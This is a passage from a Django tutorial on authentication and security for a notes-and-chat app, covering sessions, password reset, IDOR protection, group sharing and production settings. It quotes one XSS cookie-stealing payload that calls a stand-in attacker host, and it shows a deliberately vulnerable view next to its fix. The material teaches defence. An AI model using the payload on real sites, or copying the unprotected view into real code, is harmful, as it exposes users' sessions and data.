# Tutorial 05 — Django Authentication and Security

> This tutorial walks you through the **full security stack of a Django application**:
> login/logout → password reset → object protection → groups for shared access.
>
> The project — **`notes_chat_app`** — is a notes manager with real-time group chat.
> In this section we examine the security layers that are already implemented in the application.
> You will see how security is "woven" into real code rather than existing separately.

---

## Contents

**Architectural foundation** _(read before the code)_
- [01 · AUTH BASICS — Authentication vs Authorization](#01--auth-basics)
- [02 · SESSIONS — How Django remembers the user](#02--sessions)
- [03 · PASSWORD SECURITY — Resetting and changing the password](#03--password-security)
- [04 · OBJECT-LEVEL PERMISSIONS — Protection against IDOR](#04--object-level-permissions)
- [05 · GROUP SHARING — Shared access through Django Groups](#05--group-sharing)
- [06 · SECURITY SETTINGS — What and why](#06--security-settings)

**Step-by-step implementation**
1. [Step 0 — Launching the project (Docker)](#step-0--launch)
2. [Step 1 — Settings: auth + security](#step-1--settings)
3. [Step 2 — URLs: connecting the built-in auth views](#step-2--urls)
4. [Step 3 — Login / Register templates](#step-3--login--register)
5. [Step 4 — Password Reset Flow (5 templates)](#step-4--password-reset)
6. [Step 5 — Password Change](#step-5--password-change)
7. [Step 6 — Object-Level Permissions in views.py](#step-6--object-level-permissions)
8. [Step 7 — Models: Group FK](#step-7--models-group-fk)
9. [Step 8 — Selectors: Q-filter for group access](#step-8--selectors)
10. [Step 9 — Services: Group CRUD](#step-9--services)
11. [Step 10 — Group Views + URLs](#step-10--group-views)
12. [Step 11 — Group Templates](#step-11--group-templates)
13. [Project file structure](#file-structure)

---

## 01 · AUTH BASICS

> **The main question:** Who are you and what are you allowed to do?
>
> These two questions are the foundation of any security system.
> Django answers them through two different systems.

### Analogy — a passport and a concert ticket

- **Passport** = **Authentication (AuthN)**: "Who are you?" — confirms identity.
  A guard checks the document and makes sure it is genuine.
- **Ticket** = **Authorization (AuthZ)**: "Where are you allowed to go?" — determines rights.
  The cashier checks the ticket and decides where you can sit (VIP or the stalls).

At the airport: security checks your passport (AuthN), then your boarding pass (AuthZ).
A passport without a ticket — you won't be let through. A ticket without a passport — neither.

### Table: AuthN vs AuthZ

| | Authentication (AuthN) | Authorization (AuthZ) |
|--|------------------------|---------------------|
| **Question** | Who are you? | What are you allowed to do? |
| **Answer** | Password check | Check of rights on the object |
| **Django tool** | `authenticate()`, `login()` | `@login_required`, `get_object_or_404` |
| **Where it is checked** | `AuthenticationMiddleware` | In each view separately |
| **What if it fails** | Form with an error | 302 Redirect or 404/403 |

### Django Auth components

```python
from django.contrib.auth import authenticate, login, logout
from django.contrib.auth.models import User
from django.contrib.auth.decorators import login_required

# 1. Verify credentials (AuthN):
user = authenticate(request, username='alice', password='secret')
# → Django: looks up the User with username='alice'
# → Checks the PBKDF2 password hash in the DB
# → Returns a User object if it matches, or None

# 2. Start a session after a successful login:
if user is not None:
    login(request, user)   # ← creates a session_id in the DB + a cookie in the browser
    # Now request.user = alice in all subsequent requests

# 3. End the session:
logout(request)   # ← deletes the session record from the DB + forcibly clears the cookie
```

### Middleware chain: who sets `request.user`

```
Every request passes through the ENTIRE middleware chain (settings.py → MIDDLEWARE):

1. DebugExceptionMiddleware  — logging/displaying errors in dev
2. DebugToolbarMiddleware    — Django Debug Toolbar
3. SecurityMiddleware        — HTTPS redirect, HTTP security headers
4. SessionMiddleware         — reads Cookie: sessionid=... → loads the session from the DB
5. CommonMiddleware          — trailing slash, Content-Type
6. CsrfViewMiddleware        — checks csrfmiddlewaretoken in POST requests
7. AuthenticationMiddleware  — reads the session → sets request.user
   │                           If there is a session → request.user = User(id=42)
   │                           If there is none     → request.user = AnonymousUser
8. MessageMiddleware         — Django messages flash framework
9. XFrameOptionsMiddleware   — X-Frame-Options: DENY header
   │
   ▼
View function (request.user is already set!)
```

**Middleware order matters:**
- `SessionMiddleware` must come before `AuthenticationMiddleware` — Auth reads the session
- `CsrfViewMiddleware` before the View — it checks CSRF before any view is called
- `SessionMiddleware` before `CsrfViewMiddleware` — CSRF uses the session

### `@login_required` — what it does and where it lives

```python
# notes_app/views.py
from django.contrib.auth.decorators import login_required

@login_required   # ← decorator, checks request.user.is_authenticated
def note_list(request):
    # If request.user = AnonymousUser:
    #   → redirect to LOGIN_URL (settings.py) + ?next=/notes/
    #   → 302 /accounts/login/?next=/notes/
    # If request.user = User(id=42):
    #   → runs the view normally
    notes = selectors.get_user_notes(request.user)
    return render(request, 'notes_app/note_list.html', {'notes': notes})
```

```python
# settings.py — where to redirect users who are not logged in:
LOGIN_URL = '/accounts/login/'
LOGIN_REDIRECT_URL = '/notes/'           # where to go AFTER a successful login
LOGOUT_REDIRECT_URL = '/accounts/login/' # where to go AFTER logout
```

> **Important:** `@login_required` is only AuthN ("are you logged in?").
> It does NOT check whether this particular note belongs to you.
> That requires a separate AuthZ step in the view (see Step 6).

---

## 02 · SESSIONS

> **The problem:** HTTP is a stateless protocol. Every request is as if it were the "first".
> The server doesn't know who you are unless you send proof.

### Analogy — a loyalty card at a café

Imagine a café where you earn points for every coffee. Without a card, the waiter forgets you
after every visit. With a card, the points accumulate.

**Session cookie = loyalty card**: the browser stores it and automatically presents it with every request.

### Step-by-step flow: Login → Cookie → Next request

```
STEP 1: Alice clicks "Log in"
─────────────────────────────────────────────────────────────────────────
Browser:  POST /accounts/login/  {username: 'alice', password: 'secret'}
Django:   CsrfViewMiddleware → checks csrfmiddlewaretoken ✓
          authenticate('alice', 'secret') → User(id=42) ✓
          login(request, user)
            → INSERT INTO django_session
              (session_key='xK9mPq', session_data={_auth_user_id: 42}, expire_date=...)
          Response: 302 /notes/
          Header:    Set-Cookie: sessionid=xK9mPq; HttpOnly; SameSite=Lax; Path=/

STEP 2: The browser stores the cookie. Alice sees /notes/
─────────────────────────────────────────────────────────────────────────
The browser stores: sessionid=xK9mPq (in the browser's protected storage)

STEP 3: Alice's next request (GET /notes/)
─────────────────────────────────────────────────────────────────────────
Browser:  GET /notes/
Header:   Cookie: sessionid=xK9mPq   ← sent automatically!
          Django SessionMiddleware:
            SELECT * FROM django_session WHERE session_key='xK9mPq'
            → session_data = {_auth_user_id: 42}
          Django AuthenticationMiddleware:
            SELECT * FROM auth_user WHERE id=42
            → request.user = User(id=42, username='alice')
View:     @login_required → request.user.is_authenticated → True ✓
          notes = selectors.get_user_notes(request.user)
          → SQL: SELECT * FROM note WHERE user_id=42 OR group_id IN (...)

STEP 4: Logout
─────────────────────────────────────────────────────────────────────────
Browser:  POST /accounts/logout/  (with the CSRF token in the POST body)
Django:   logout(request)
            → DELETE FROM django_session WHERE session_key='xK9mPq'
          Response: 302 /accounts/login/
          Header:    Set-Cookie: sessionid=; expires=Thu, 01 Jan 1970 00:00:00 GMT
Browser:  Deletes the cookie. request.user → AnonymousUser.
```

### The cookie in DevTools: how to see the session

```
Chrome DevTools → Application → Storage → Cookies → http://localhost

Field         Value
─────────────────────────────────────────────────
Name          sessionid
Value         xK9mPq...  (32-character random key)
Domain        localhost
Path          /
Expires       (in 2 weeks by default)
Size          ~100 B
HttpOnly      ✓  (JS cannot read it!)
SameSite      Lax

Try it in the Console:
  document.cookie  →  'csrftoken=abc123'
  (sessionid is missing — HttpOnly!)
```

### Cookie settings in settings.py

```python
# settings.py:

SESSION_COOKIE_HTTPONLY = True
# ↑ JS cannot read sessionid via document.cookie
#   Protection against XSS attacks that try to steal the cookie:
#   <script>fetch('evil.com?c='+document.cookie)</script>
#   → with HttpOnly: sessionid is absent from document.cookie → the attack is useless

SESSION_COOKIE_SAMESITE = "Lax"
# ↑ "Lax": the cookie is sent only from the same site OR
#   on navigational GET requests (links)
#   CSRF protection: evil.com cannot send a POST with your cookie
#   "Strict" — stricter: the cookie is not sent even when following external links
#   "None" — dangerous without the Secure (HTTPS) flag

CSRF_COOKIE_HTTPONLY = False
# ↑ False: JS can read csrftoken (needed for fetch/axios requests with a CSRF header)
#   If you don't use JS for forms → True for strict protection

# Production HTTPS (uncomment when you have an SSL certificate):
# SESSION_COOKIE_SECURE = True   # cookie only over HTTPS (not HTTP)
# CSRF_COOKIE_SECURE = True
```

---

## 03 · PASSWORD SECURITY

> Django provides a **complete password management system "out of the box"** via `django.contrib.auth`.
> You don't need to write a single view for login, logout, password reset or change.

### What `include('django.contrib.auth.urls')` connects

```python
# notes_project/urls.py:
path("accounts/", include("django.contrib.auth.urls")),
```

This automatically registers:

| URL | View | Name (for `{% url %}`) | Template (you need to create it) |
|-----|------|------------------------|------------------------|
| `/accounts/login/` | `LoginView` | `login` | `registration/login.html` |
| `/accounts/logout/` | `LogoutView` | `logout` | (redirect, no template) |
| `/accounts/password_change/` | `PasswordChangeView` | `password_change` | `registration/password_change_form.html` |
| `/accounts/password_change/done/` | `PasswordChangeDoneView` | `password_change_done` | `registration/password_change_done.html` |
| `/accounts/password_reset/` | `PasswordResetView` | `password_reset` | `registration/password_reset_form.html` |
| `/accounts/password_reset/done/` | `PasswordResetDoneView` | `password_reset_done` | `registration/password_reset_done.html` |
| `/accounts/reset/<uidb64>/<token>/` | `PasswordResetConfirmView` | `password_reset_confirm` | `registration/password_reset_confirm.html` |
| `/accounts/reset/done/` | `PasswordResetCompleteView` | `password_reset_complete` | `registration/password_reset_complete.html` |

**Conclusion:** 8 URLs + 7 views are already written by Django — you only write the HTML templates.

### Password Reset Flow — 5 steps

```
Step 1: /accounts/password_reset/
─────────────────────────────────────────────────────────────────────────
Alice forgot her password → enters her email in the form
→ password_reset_form.html

Step 2: Django processes the POST
─────────────────────────────────────────────────────────────────────────
Django looks for a User with that email (says nothing if none is found —
safe behavior: we don't reveal whether such an email exists)
Generates a unique token: sha256(user_pk + timestamp + SECRET_KEY)
Sends an email with a link:
  /accounts/reset/<uidb64>/<token>/

[DEV: EMAIL_BACKEND = console → the email is printed to docker logs]
[PROD: EMAIL_BACKEND = smtp → a real email]

Step 3: /accounts/password_reset/done/
─────────────────────────────────────────────────────────────────────────
Django shows: "Check your email" (regardless of whether the email was found)
→ password_reset_done.html

Step 4: /accounts/reset/<uidb64>/<token>/
─────────────────────────────────────────────────────────────────────────
Alice follows the link from the email
Django: uidb64 → user_pk, token → verifies the signature
Is it valid? (72 hours, single-use — invalidated after use)
If OK → form for the new password + password validators
→ password_reset_confirm.html

Step 5: Success → /accounts/reset/done/
─────────────────────────────────────────────────────────────────────────
Password saved (hashed with PBKDF2 with a salt) → all of this user's sessions are reset
→ password_reset_complete.html
```

### How PBKDF2 stores passwords

```python
# What is stored in the DB (auth_user.password):
'pbkdf2_sha256$600000$salt$hash'
#  ↑algorithm   ↑iterations  ↑salt ↑hash

# Plain text is never stored!
# Even Django doesn't know the original password — it only checks the hash.

# Verification:
# authenticate(request, username='alice', password='mysecret')
# → pbkdf2_sha256(600000 iterations, 'mysecret' + stored_salt)
# → compares with stored_hash
# → returns a User or None

# Why 600000 iterations?
# If a hacker stole the DB → brute force:
#   SHA-256 without stretching: 10 billion attempts/sec
#   PBKDF2 with 600000 iter:  ~10 000 attempts/sec (1 000 000 times slower!)
```

### Password Validators

```python
# settings.py — 4 built-in validators:
AUTH_PASSWORD_VALIDATORS = [
    # Is the password similar to the username / email / first_name?
    {"NAME": "django.contrib.auth.password_validation.UserAttributeSimilarityValidator"},
    # At least 8 characters (configurable: "OPTIONS": {"min_length": 10})
    {"NAME": "django.contrib.auth.password_validation.MinimumLengthValidator"},
    # Is it in the list of 20 000 most common passwords? ("password", "123456", "qwerty"...)
    {"NAME": "django.contrib.auth.password_validation.CommonPasswordValidator"},
    # Does it consist only of digits?
    {"NAME": "django.contrib.auth.password_validation.NumericPasswordValidator"},
]

# Validators run:
# 1. On registration (UserCreationForm)
# 2. On password change (PasswordChangeForm, PasswordResetConfirmView)
# 3. On set_password() → validate_password()
#    NOT on User.objects.create_user() unless you call validate_password()!
```

---

## 04 · OBJECT-LEVEL PERMISSIONS

> **The most common vulnerability in web applications (OWASP A01):**
> Broken Access Control — a user gains access to someone else's data.

### What IDOR (Insecure Direct Object Reference) is

```
Alice is registered. She sees the URL of her note: /notes/42/edit/
She thinks: "What happens if I change 42 to 43?"
Alice goes to: /notes/43/edit/
If the view doesn't check the owner → Alice edits BOB's note!

This is an IDOR attack — Insecure Direct Object Reference.
OWASP A01 (Broken Access Control) — the most frequent cause of data leaks.
```

### The difference between AuthN and AuthZ by example

```python
# ─── PROBLEM: @login_required is only AuthN, not AuthZ! ─────────────────────
@login_required
def note_edit(request, pk):
    note = get_object_or_404(Note, pk=pk)   # ← IDOR vulnerability!
    # Alice is logged in → @login_required lets her through ✓
    # But note(pk=43) belongs to Bob → Alice edits someone else's data! ✗

# Generated SQL:
# SELECT * FROM note WHERE pk = 43
# → returns Bob's note! No user_id check at all!


# ─── SOLUTION: add user= to get_object_or_404 ───────────────────────────────
@login_required
def note_edit(request, pk):
    note = get_object_or_404(Note, pk=pk, user=request.user)   # ← AuthZ ✓
    # pk=43 + user=Alice
    # SQL: SELECT * FROM note WHERE pk=43 AND user_id=42
    # Bob has note(pk=43, user_id=99) → user_id=42 doesn't match → 404
```

**Golden rule:**
```
@login_required               = "are you logged in?"        (AuthN)
get_object_or_404(            = "is this object yours?"     (AuthZ)
    Note, pk=pk,
    user=request.user
)
```

**Why 404 and not 403?**
```
403 Forbidden → we tell them: "This resource exists, but you don't have access"
                The hacker knows id=43 exists → may try other attacks

404 Not Found  → we tell them: "No such resource exists"
                The hacker doesn't know whether it exists → less information for an attack

Principle: don't reveal the existence of other people's objects.
```

### Pattern for personal objects

```python
# Applies to: note_edit, note_delete, note_detail (if personal),
# notebook_edit, notebook_delete, todolist_edit, shopping_edit, etc.

@login_required
def note_delete(request, pk):
    note = get_object_or_404(Note, pk=pk, user=request.user)
    if request.method == 'POST':
        services.delete_note(note)
        messages.warning(request, 'Нотатку видалено.')
        return redirect('notes_app:note_list')
    return render(request, 'notes_app/note_confirm_delete.html', {'note': note})


@login_required
def notebook_edit(request, pk):
    # The same — Notebook with user=request.user
    notebook = get_object_or_404(Notebook, pk=pk, user=request.user)
    # ...
```

### Pattern for shared objects (owner OR group member)

```python
# Notes can belong to a group → the check is more complex:
from django.db.models import Q

@login_required
def note_detail(request, pk):
    user_groups = request.user.groups.all()
    note = get_object_or_404(
        Note.objects.filter(
            Q(user=request.user) | Q(group__in=user_groups)
        ),
        pk=pk
    )
    # Alice sees the note if:
    #   note.user == Alice (personal note)
    #   OR note.group in Alice.groups.all() (group note)
    #
    # SQL:
    # SELECT * FROM note
    # WHERE pk = 43
    #   AND (user_id = 42 OR group_id IN (1, 3))
    # → If neither one nor the other → 404
    return render(request, 'notes_app/note_detail.html', {'note': note})
```

### Table of protected views in notes_app

| View | Protection | How it is implemented |
|------|--------|----------------|
| `note_list` | `@login_required` | Selector `Q(user=user) \| Q(group__in=...)` |
| `note_edit` | `@login_required` + owner | Q-filter for access, then `note.user != request.user` for editing |
| `note_delete` | `@login_required` + owner | The same |
| `notebook_edit` | `@login_required` + owner | `get_object_or_404(Notebook, pk=pk, user=request.user)` |
| `notebook_delete` | `@login_required` + owner | The same |
| `group_detail` | `@login_required` + membership | `get_group_with_members(pk, user)` → None if not a member |
| `group_delete` | `@login_required` + membership | `group.user_set.filter(pk=user.pk).exists()` |

---

## 05 · GROUP SHARING

> **The idea:** Alice wants to share notes with her team.
> She creates the group "Development Team" and adds Bob.
> Both of them see notes and shopping lists tagged with this group.

### Django's built-in Group model

Django already has a ready-made `Group` model in `django.contrib.auth`:

```python
from django.contrib.auth.models import Group

# Every Group has:
#   id          — PK
#   name        — name ('Family', 'Team', 'Class')
#   user_set    — M2N relationship with User (via the auth_user_groups junction table)
#   permissions — M2N relationship with Permission (for role-based access — not our case)

# In notes_app we use Group for SHARING DATA between users,
# not for the Django Permission System (is_staff, is_superuser, permissions).
```

### ER diagram: User, Group, Note, ShoppingList

```
┌──────────────┐         ┌──────────────────────┐         ┌──────────────┐
│    User      │         │  auth_user_groups     │         │    Group     │
│──────────────│         │──────────────────────│         │──────────────│
│ id (PK)      │◄───────►│ user_id  (FK → User) │◄───────►│ id (PK)      │
│ username     │   M:N   │ group_id (FK → Group)│   M:N   │ name         │
│ password     │         └──────────────────────┘         └──────┬───────┘
│ email        │                                                  │
└──────┬───────┘                                                  │ 1:N (FK SET_NULL)
       │                                                          │
       │ 1:N (FK CASCADE)                                         │
       │                                                          │
       ▼                                                          ▼
┌────────────────────────────────────────────────────────────────────────────┐
│                                   Note                                      │
│────────────────────────────────────────────────────────────────────────────│
│ id (PK)                                                                     │
│ title                                                                       │
│ content                                                                     │
│ user_id   (FK → User,  CASCADE)  ← required: who the owner is              │
│ group_id  (FK → Group, SET_NULL) ← optional: for sharing                   │
│ notebook_id (FK → Notebook, SET_NULL)                                       │
│ priority, is_pinned, is_archived ...                                        │
└────────────────────────────────────────────────────────────────────────────┘

┌────────────────────────────────────────────────────────────────────────────┐
│                                ShoppingList                                 │
│────────────────────────────────────────────────────────────────────────────│
│ user_id   (FK → User,  CASCADE)  ← owner                                   │
│ group_id  (FK → Group, SET_NULL) ← for sharing                             │
└────────────────────────────────────────────────────────────────────────────┘

If group_id = NULL  → personal note (only user_id sees it)
If group_id = 5     → group note (all members of group 5 see it)
```

### Q-filter: "mine or the group's"

```python
# notes_app/selectors.py
from django.db.models import Q

def get_user_notes(user, *, archived=False, notebook=None, tag=None, search=None):
    """Returns the user's notes + notes of the groups they belong to."""
    user_groups = user.groups.all()   # all of the user's groups (1 SQL)
    qs = Note.objects.filter(
        Q(user=user) |               # own notes
        Q(group__in=user_groups),    # notes of groups where user is a member
        is_archived=archived,
    ).select_related('notebook', 'group').prefetch_related('tags')
    # ...
    return qs.order_by('-is_pinned', '-priority', '-updated_at')
```

```
Alice is in the groups: [Team(id=1), Family(id=3)]

SQL (simplified):
  SELECT * FROM note
  WHERE (user_id = 42)              -- Alice's personal notes
     OR (group_id IN (1, 3))        -- notes of her groups
  AND is_archived = FALSE
  ORDER BY is_pinned DESC, priority DESC, updated_at DESC
```

### Comparison of sharing approaches

| | M2M `shared_with` (TodoList) | Group FK (Note, ShoppingList) |
|--|------------------------------|-------------------------------|
| **Where** | `TodoList.shared_with = ManyToManyField(User)` | `Note.group = ForeignKey(Group)` |
| **Share with whom** | Specific users | All group members |
| **Management** | Through a form with checkboxes | Through `/groups/<pk>/` |
| **When it fits** | "Share with Bob specifically" | "Share with the whole team" |
| **Deletion** | The `ManyToMany` record is deleted | `SET_NULL` → the note becomes personal |

---

## 06 · SECURITY SETTINGS

> Django has lots of security settings. Most are "off" by default
> so as not to break localhost development. In production they need to be turned on.

### Table: each setting and what it protects against

| Setting | Value | What it protects against |
|-----------|----------|-----------------|
| `SESSION_COOKIE_HTTPONLY = True` | JS doesn't read sessionid | XSS → Session Hijacking |
| `SESSION_COOKIE_SAMESITE = "Lax"` | Cookie only from the same site | CSRF via cross-site forms |
| `CSRF_COOKIE_HTTPONLY = False` | JS reads csrftoken | (False = for fetch/axios) |
| `X_FRAME_OPTIONS = "DENY"` | Forbids `<iframe>` embedding | Clickjacking attacks |
| `SECURE_CONTENT_TYPE_NOSNIFF = True` | Don't "guess" the MIME type | XSS via forged files |
| `DEBUG = False` | Hides stack traces | Leaking SECRET_KEY and code |
| `ALLOWED_HOSTS = ['mysite.com']` | Only this domain | HTTP Host header attacks |
| `CSRF_TRUSTED_ORIGINS = [...]` | Allowed HTTPS origins | CSRF via ngrok/proxy |

### What leaks with `DEBUG = True` in production

```
A server error with DEBUG=True shows:
  ✗ The full stack trace (file paths, function names, lines of code)
  ✗ The values of ALL local variables at the moment of the error
  ✗ SECRET_KEY leaks! (a hacker can forge session cookies and CSRF tokens)
  ✗ All SQL queries are kept in memory → memory leak under load
  ✗ INSTALLED_APPS, DATABASES, MIDDLEWARE — the whole config is visible in the browser

DEBUG = False + ALLOWED_HOSTS = ['mysite.com'] are mandatory in production.
```

### Production HTTPS (uncomment on the server)

```python
# settings.py — commented out in dev (so that localhost works over HTTP):

# SESSION_COOKIE_SECURE = True
# ↑ The cookie is sent ONLY over HTTPS
# Without this: a man-in-the-middle can intercept sessionid over HTTP

# CSRF_COOKIE_SECURE = True
# ↑ The same for the CSRF cookie

# SECURE_SSL_REDIRECT = True
# ↑ Any HTTP request → 301 Moved Permanently → HTTPS

# SECURE_HSTS_SECONDS = 31536000  # 1 year
# ↑ The browser remembers: ONLY HTTPS for 1 year
# (HTTP Strict Transport Security header)
# WARNING: once enabled — hard to roll back! The browser caches it and ignores HTTP.
```

### ngrok and CSRF_TRUSTED_ORIGINS

`notes_chat_app` uses ngrok for public access. Django checks the `Origin` header on POST over HTTPS:

```python
# settings.py (already implemented):
_ngrok_domain = os.environ.get('NGROK_DOMAIN', '')
CSRF_TRUSTED_ORIGINS = [f'https://{_ngrok_domain}'] if _ngrok_domain else []
# = ['https://fawn-natural-mayfly.ngrok-free.app']

# .env:
# NGROK_DOMAIN=fawn-natural-mayfly.ngrok-free.app

# Without CSRF_TRUSTED_ORIGINS:
# POST /accounts/login/ via ngrok → 403 Forbidden: CSRF verification failed
# Origin: https://fawn-natural-mayfly.ngrok-free.app — not in trusted origins!
```

---

## Step 0 — Launch

```bash
# 1. Copy the configuration
cp .env.example .env
# Edit .env: SECRET_KEY, POSTGRES_*, NGROK_* if needed

# 2. Bring up the whole stack (PostgreSQL + Redis + Web + Nginx + ngrok + Selenium)
docker compose up --build

# 3. View the logs (the password reset email will be here)
docker compose logs -f web

# 4. Open in the browser
open http://localhost   # via nginx
# OR
open http://localhost:8001   # directly to Uvicorn

# 5. Demo data (3 users, groups, notes)
# If SEED_DEMO_DATA=1 in .env → automatically at startup
# Manually:
docker compose exec web python manage.py seed_demo_data
# Logins: demo_alice/demo1234, demo_bob/demo1234, demo_carol/demo1234
```

### What to look at in the browser

| URL | What it shows |
|-----|-----------|
| `http://localhost/accounts/login/` | Login form |
| `http://localhost/register/` | Registering a new account |
| `http://localhost/accounts/password_reset/` | Password recovery form |
| `http://localhost/accounts/password_change/` | Password change (after logging in) |
| `http://localhost/notes/` | Note list (logged-in users only) |
| `http://localhost/groups/` | My groups |
| `http://localhost/groups/new/` | Create a group |
| `http://localhost/admin/` | Django Admin |

### Where to find the email in the Docker logs

```bash
# After clicking "Надіслати посилання" (Send link) in the password_reset form:
docker compose logs web | grep -A 10 "Subject: Password reset"

# OR in real time:
docker compose logs -f web
# Look for the lines:
# Content-Type: text/plain; charset="utf-8"
# Subject: Password reset on localhost
# ...
# http://localhost/accounts/reset/Mg/abc123-token/   ← copy this URL!
```

---

## Step 1 — Settings

**Location:** `notes_project/settings.py`

```python
# ── Auth redirects ─────────────────────────────────────────────────────────────
LOGIN_URL = '/accounts/login/'           # @login_required → redirect here
LOGIN_REDIRECT_URL = '/notes/'           # after a successful login
LOGOUT_REDIRECT_URL = '/accounts/login/' # after logout

# ── Password Validators ────────────────────────────────────────────────────────
AUTH_PASSWORD_VALIDATORS = [
    {"NAME": "django.contrib.auth.password_validation.UserAttributeSimilarityValidator"},
    {"NAME": "django.contrib.auth.password_validation.MinimumLengthValidator"},
    {"NAME": "django.contrib.auth.password_validation.CommonPasswordValidator"},
    {"NAME": "django.contrib.auth.password_validation.NumericPasswordValidator"},
]

# ── Email (password reset) ─────────────────────────────────────────────────────
EMAIL_BACKEND = "django.core.mail.backends.console.EmailBackend"
# DEV: email goes to the container's stdout/logs
# PROD: replace with:
# EMAIL_BACKEND = "django.core.mail.backends.smtp.EmailBackend"
# EMAIL_HOST = "smtp.gmail.com"
# EMAIL_PORT = 587
# EMAIL_USE_TLS = True
# EMAIL_HOST_USER = os.environ['EMAIL_HOST_USER']
# EMAIL_HOST_PASSWORD = os.environ['EMAIL_HOST_PASSWORD']
# DEFAULT_FROM_EMAIL = "noreply@mysite.com"

# ── ngrok CSRF ────────────────────────────────────────────────────────────────
_ngrok_domain = os.environ.get('NGROK_DOMAIN', '')
CSRF_TRUSTED_ORIGINS = [f'https://{_ngrok_domain}'] if _ngrok_domain else []

# ── Web Security ──────────────────────────────────────────────────────────────
SESSION_COOKIE_HTTPONLY = True      # JS doesn't read sessionid (XSS protection)
CSRF_COOKIE_HTTPONLY = False        # JS reads csrftoken (for fetch in the chat)
SESSION_COOKIE_SAMESITE = "Lax"    # CSRF protection for cookies
X_FRAME_OPTIONS = "DENY"           # Clickjacking protection
SECURE_CONTENT_TYPE_NOSNIFF = True  # MIME sniffing protection

# ── Messages → Bootstrap alert variants ────────────────────────────────────────
from django.contrib.messages import constants as messages_constants
MESSAGE_TAGS = {
    messages_constants.DEBUG:   'secondary',
    messages_constants.INFO:    'info',
    messages_constants.SUCCESS: 'success',
    messages_constants.WARNING: 'warning',
    messages_constants.ERROR:   'danger',
}
```

---

## Step 2 — URLs

**Location:** `notes_project/urls.py`

```python
from django.contrib import admin
from django.urls import path, include
from debug_toolbar.toolbar import debug_toolbar_urls

urlpatterns = [
    path("admin/", admin.site.urls),

    # Django built-in auth: login, logout, password change, password reset
    # Registers 8 URLs in a single line!
    path("accounts/", include("django.contrib.auth.urls")),

    # Our application: notes, groups, registration, WebSocket chat
    path("", include("notes_app.urls", namespace="notes_app")),
] + debug_toolbar_urls()
```

**Location:** `notes_app/urls.py`

```python
from django.urls import path
from . import views

app_name = 'notes_app'

urlpatterns = [
    # ── Notes ──────────────────────────────────────────────────────────────
    path('notes/',              views.note_list,    name='note_list'),
    path('notes/new/',          views.note_create,  name='note_create'),
    path('notes/<int:pk>/',     views.note_detail,  name='note_detail'),
    path('notes/<int:pk>/edit/',   views.note_edit,   name='note_edit'),
    path('notes/<int:pk>/delete/', views.note_delete, name='note_delete'),

    # ── Notebooks ──────────────────────────────────────────────────────────
    path('notebooks/',               views.notebook_list,   name='notebook_list'),
    path('notebooks/new/',           views.notebook_create, name='notebook_create'),
    path('notebooks/<int:pk>/edit/', views.notebook_edit,   name='notebook_edit'),
    path('notebooks/<int:pk>/delete/', views.notebook_delete, name='notebook_delete'),

    # ── Auth (custom — registration not in auth.urls) ──────────────────────
    path('register/', views.register, name='register'),

    # ── Groups ─────────────────────────────────────────────────────────────
    path('groups/',                  views.group_list,    name='group_list'),
    path('groups/new/',              views.group_create,  name='group_create'),
    path('groups/<int:pk>/',         views.group_detail,  name='group_detail'),
    path('groups/<int:pk>/delete/',  views.group_delete,  name='group_delete'),

    # ── Chat (WebSocket, via groups) ──────────────────────────────────────
    path('groups/<int:pk>/chat/',    views.group_chat,    name='group_chat'),
]
```

---

## Step 3 — Login / Register

### templates/registration/login.html

Django automatically looks for `registration/login.html` for `LoginView`.

```html
{% extends 'base.html' %}

{% block body %}
<div class="min-vh-100 d-flex align-items-center justify-content-center bg-light">
  <div class="card shadow" style="width: 400px;">
    <div class="card-body p-4">

      <!-- Logo / brand -->
      <div class="text-center mb-4">
        <i class="bi bi-journal-bookmark-fill display-4 text-primary"></i>
        <h5 class="fw-bold mt-2 mb-0">Notes Chat App</h5>
        <p class="text-muted small">Увійди до свого акаунту</p>
      </div>

      <!-- Login error -->
      {% if form.errors %}
      <div class="alert alert-danger py-2 small">
        <i class="bi bi-exclamation-triangle me-1"></i>
        Невірний логін або пароль. Спробуй ще раз.
      </div>
      {% endif %}

      <!-- Login form -->
      <form method="post">
        {% csrf_token %}
        {# ↑ MANDATORY! Without csrf_token Django will reject the POST with 403 Forbidden #}

        <div class="mb-3">
          <label class="form-label fw-semibold">Логін</label>
          <input type="text"
                 name="{{ form.username.html_name }}"
                 class="form-control"
                 autofocus
                 autocomplete="username"
                 placeholder="твій_логін">
        </div>
        <div class="mb-4">
          <label class="form-label fw-semibold">Пароль</label>
          <input type="password"
                 name="{{ form.password.html_name }}"
                 class="form-control"
                 autocomplete="current-password">
        </div>

        <!-- next: where to return after logging in (e.g. /notes/42/) -->
        <input type="hidden" name="next" value="{{ next }}">
        {# LoginView passes 'next' in the context — the URL to redirect to after login #}

        <button type="submit" class="btn btn-primary w-100 py-2">
          <i class="bi bi-box-arrow-in-right me-2"></i>Увійти
        </button>
      </form>

      <hr class="my-3">
      <div class="d-flex justify-content-between">
        <a href="{% url 'notes_app:register' %}" class="text-decoration-none small">
          <i class="bi bi-person-plus me-1"></i>Зареєструватись
        </a>
        <a href="{% url 'password_reset' %}" class="text-decoration-none small text-muted">
          {# 'password_reset' — a built-in URL from django.contrib.auth.urls #}
          Забули пароль?
        </a>
      </div>

    </div>
  </div>
</div>
{% endblock %}
```

### notes_app/views.py — Registration view

`django.contrib.auth.urls` doesn't include registration — you have to write it yourself:

```python
# notes_app/views.py
from django.contrib.auth.forms import UserCreationForm
from django.contrib.auth import login


def register(request):
    """
    Registering a new user.
    After successful registration — auto-login and redirect to note_list.
    """
    if request.user.is_authenticated:
        # Already logged in → don't show the registration form
        return redirect('notes_app:note_list')

    if request.method == 'POST':
        form = UserCreationForm(request.POST)
        if form.is_valid():
            user = form.save()
            # auto-login: don't force the user to log in right after registering
            login(request, user)
            messages.success(request, f'Вітаємо, {user.username}! Акаунт створено.')
            return redirect('notes_app:note_list')
    else:
        form = UserCreationForm()

    return render(request, 'registration/register.html', {'form': form})
```

### templates/registration/register.html

```html
{% extends 'base.html' %}
{% load crispy_forms_tags %}

{% block body %}
<div class="min-vh-100 d-flex align-items-center justify-content-center bg-light">
  <div class="card shadow" style="width: 440px;">
    <div class="card-body p-4">

      <div class="text-center mb-4">
        <i class="bi bi-person-plus-fill display-4 text-success"></i>
        <h5 class="fw-bold mt-2 mb-0">Реєстрація</h5>
        <p class="text-muted small">Створи новий акаунт</p>
      </div>

      <form method="post">
        {% csrf_token %}
        {{ form|crispy }}
        {# UserCreationForm: username, password1, password2 #}
        {# crispy: Bootstrap 5 styles automatically #}
        <button type="submit" class="btn btn-success w-100 mt-2 py-2">
          <i class="bi bi-check-circle me-2"></i>Зареєструватись
        </button>
      </form>

      <hr class="my-3">
